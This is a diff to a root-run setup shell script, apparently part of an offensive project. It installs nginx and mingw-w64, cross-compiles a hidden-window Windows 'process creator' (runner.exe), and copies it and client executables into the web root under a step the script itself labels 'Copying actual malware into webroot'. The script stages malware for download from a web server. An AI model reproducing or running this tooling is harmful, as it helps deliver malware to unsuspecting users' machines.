@@ -3,8 +3,13 @@
 if [ "$EUID" -eq 0 ]; then
     
     echo "Installing required packages"
-    apt install nginx, python3, python3-venv
+    apt install nginx python3 python3-venv python3-pil mingw-w64
     
+    echo "Compiling process creator"
+    x86_64-w64-mingw32-gcc runner.c -o runner.exe -mwindows
+    echo "Sucessfully compiled process creator"
+
+
     echo "Installing pip packages"
     python3 -m venv venv
     source venv/bin/activate
@@ -16,7 +21,9 @@ if [ "$EUID" -eq 0 ]; then
     echo "Sucessfully copied"
 
     echo "Copying actual malware into webroot"
-    cp client.exe /var/www/html
+    cp runner.exe /var/www/html
+    cp client.exe /var/www/html 2>/dev/null
+    cp client     /var/www/html 2>/dev/null
     echo "Sucessfully copied"
 
     echo "Copying nginx config"
